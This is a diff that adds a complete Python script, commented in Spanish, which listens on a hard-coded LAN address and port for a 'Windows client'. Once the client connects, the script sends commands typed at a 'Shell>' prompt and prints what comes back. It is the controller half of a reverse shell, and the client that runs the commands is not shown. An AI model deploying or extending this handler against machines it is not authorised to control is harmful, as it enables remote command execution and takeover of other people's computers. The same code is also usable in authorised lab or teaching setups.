@@ -1,0 +1,30 @@
+# Desde servidor Linux
+
+import socket
+
+def start_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(('192.168.1.35', 1764))
+    server_socket.listen(1)  # Establece el tamaño máximo de la cola de conexiones entrantes
+
+    print("[+] Esperando una conexión entrante desde el cliente Windows...")
+
+    client_socket, client_address = server_socket.accept()
+    print(f"[+] ¡Conexión establecida con el cliente Windows: {client_address}")
+
+    while True:
+        command = input("Shell> ")  # Espera un comando desde el usuario del servidor Linux
+        client_socket.send(command.encode())  # Envía el comando al cliente Windows
+
+        if command.lower() == "terminate":
+            break
+
+        result = client_socket.recv(4096).decode()  # Recibe el resultado del cliente Windows
+        print(result)
+
+    client_socket.close()
+    server_socket.close()
+
+if __name__ == "__main__":
+    start_server()
+                     
